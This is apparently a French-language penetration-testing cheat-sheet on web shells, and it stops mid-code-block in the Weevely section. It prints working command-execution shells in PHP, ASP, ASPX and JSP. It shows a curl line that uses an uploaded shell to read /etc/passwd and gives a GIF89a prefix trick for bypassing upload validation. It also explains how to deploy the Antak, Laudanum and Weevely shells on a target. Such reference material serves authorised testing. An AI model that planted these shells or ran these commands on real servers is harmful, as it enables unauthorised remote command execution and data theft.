# Web Shells

Les web shells permettent d'exécuter des commandes via une interface web, souvent après avoir exploité une vulnérabilité d'upload de fichier ou d'inclusion.

## Types de Web Shells

Les web shells sont disponibles pour différentes technologies web:

| Technologie | Extension | Environnement typique |
|-------------|-----------|------------------------|
| PHP | .php, .php5, .phtml | Apache, Nginx, IIS |
| ASP | .asp | IIS (anciennes versions) |
| ASPX | .aspx | IIS (.NET) |
| JSP | .jsp | Tomcat, JBoss, WebSphere |
| Perl | .pl, .cgi | Serveurs CGI |
| Python | .py | Serveurs WSGI, Django, Flask |

## PHP Web Shells

PHP est le langage de scripting serveur le plus répandu, ce qui en fait une cible privilégiée.

### Shells PHP Minimalistes

```php
// One-liner basique
<?php system($_GET['cmd']); ?>

// Alternative avec exec
<?php exec($_REQUEST['cmd']); ?>

// Shell plus complet avec formulaire
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
<form method="post">
Command: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
```

### Utilisation des Web Shells PHP

```bash
# Exécution via URL
http://target.com/uploads/shell.php?cmd=id

# Via curl
curl -G http://target.com/uploads/shell.php --data-urlencode "cmd=cat /etc/passwd"
```
### Contournement des Restrictions d'Upload
```php
// Extension alternative: .phtml, .php5, .php.jpg
// Headers modifiés: image/gif, image/jpeg

// Préfixe GIF89a pour tromper la validation
GIF89a;
<?php system($_GET['cmd']); ?>
```
## ASP/ASPX Web Shells
Pour les serveurs Windows exécutant IIS.
### Shells ASP Basiques
```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c " & Request.QueryString("cmd"))
o = cmd.StdOut.Readall()
Response.write("<pre>")
Response.write(o)
Response.write("</pre>")
%>
```
### Shells ASPX
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.QueryString["cmd"] != null)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            
            Response.Write("<pre>");
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write("</pre>");
            p.Close();
        }
    }
</script>
<html>
<body>
    <form runat="server">
        <asp:TextBox ID="cmdTextBox" runat="server"></asp:TextBox>
        <asp:Button ID="cmdButton" runat="server" Text="Run" OnClick="Page_Load" />
    </form>
</body>
</html>
```
### Antak Webshell

[Antak](https://github.com/samratashok/nishang/tree/master/Antak-WebShell) est un web shell PowerShell avancé inclus dans Nishang.

```bash
# Copier le shell
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/pentest/shell.aspx

# Modifier les identifiants (par défaut: username/password)
# Uploader sur la cible
```
## JSP Web Shells
Pour les serveurs d'applications Java comme Tomcat, JBoss ou WebSphere.

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("<pre>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
    out.println("</pre>");
}
%>
<form method="get">
Command: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
```
## Frameworks de Web Shells Professionnels
### Laudanum
[Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) est une collection de web shells pour différentes plateformes, préinstallé dans Kali Linux.

```bash
# Emplacement dans Kali
ls /usr/share/laudanum/

# Copier et personnaliser un shell PHP
cp /usr/share/laudanum/php/shell.php /home/pentest/customshell.php
# Modifier l'adresse IP autorisée dans le fichier
```
### Weevely
[Weevely](https://github.com/epinna/weevely3) est un shell PHP obfusqué avec canal crypté et nombreuses fonctionnalités.

```bash
# Génération d'un shell avec mot de passe
weevely generate password /home/pentest